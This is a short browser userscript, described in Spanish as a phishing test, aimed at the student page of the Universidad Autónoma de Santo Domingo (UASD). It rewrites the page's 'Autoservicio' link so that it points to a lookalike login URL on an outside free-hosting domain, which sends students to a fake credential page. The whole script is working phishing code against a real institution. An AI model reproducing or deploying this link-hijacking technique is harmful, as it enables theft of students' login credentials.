// ==UserScript==
// @name          Phishing botón Autoservicio página de la UASD
// @description	  Prueba de phishing la pagina de autoservicio de la UASD
// @namespace     http://userscripts.org/users/445780
// @include       http://uasd.edu.do/hots/Estudiantes.html

// Developed by Alex Rafael Polanco Bobadilla
// ==/UserScript==

(function() 
{
	boton = 0;
	//if (boton != 0) return;
		
	tabla     = document.getElementsByTagName("table")[6];
	fila       = tabla.getElementsByTagName("tr")[1];
	celda       = fila.getElementsByTagName("td")[1];
	
	celda.getElementsByTagName("a")[0].innerHTML    = "Autoservicio";
	celda.getElementsByTagName("a")[0].href         = "http://autoservicio-uasd-edu.do.comze.com/pls/PROD/twbkwbis.P_WWWLogin.htm.php";
	celda.getElementsByTagName("a")[0].target       = "_blank";

})();